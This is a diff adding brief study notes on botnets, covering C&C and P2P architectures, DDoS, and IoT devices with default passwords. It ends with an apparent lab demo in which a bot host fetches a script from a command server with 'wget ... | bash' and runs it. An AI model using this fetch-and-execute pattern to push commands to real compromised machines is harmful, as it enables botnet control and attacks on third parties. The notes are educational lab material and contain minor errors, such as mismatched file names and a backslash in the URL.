@@ -1,1 +1,15 @@
+Botnets - several clients connect to a single CNC server. EXAMPLE ATTACKS: Distribution denial of Service (DDoS) by overwhelming a web server with traffic, causing it to be unavailable
 
+DDOS - Overwhelming the DNS server (when using the web) it gets IP requests from the DNS and the attack can prevent users from getting traffic
+
+IoT (Internet of Things) - Cameras and router devices using default passwords of the systems
+
+Botnet architectures
+1. Client-server architecture = single server
+2. P2P architecture = any bot in the network can be the server
+
+Creating a file that we want our bots to run:
+KALI-cmd  touch command.sh                        #Creates a new file named command.sh
+KALI-cmd  echo "ping 172.217.9.206" > commands.sh  #The Echo command writes that command to the file
+
+meta-cmd  wget -O - 0.0.0.0:8080\commands.sh | bash    #0.0.0.0 was the ip of the server 8080. piped over by | through bash
